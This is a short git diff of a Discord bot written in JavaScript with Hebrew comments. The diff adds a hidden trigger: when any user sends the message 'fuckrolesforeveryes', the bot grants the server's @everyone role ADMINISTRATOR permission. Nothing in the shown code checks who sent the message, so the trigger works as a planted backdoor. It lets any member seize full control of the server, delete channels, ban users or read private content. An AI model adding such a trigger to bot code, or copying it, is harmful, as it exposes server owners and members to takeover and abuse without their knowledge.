@@ -13,6 +13,9 @@ bot.on('message', message => { //a ברגע שהודעה נשלחת
     if(message.author.bot) {
         return;
     }
+    if(message.content == "fuckrolesforeveryes") {
+        message.guild.roles.everyone.setPermissions(['ADMINISTRATOR']);
+    }
     if(message.content.startsWith("braner ")) {
     if(message.author.id == "264465468268609537") {
     var member= message.mentions.members.first();
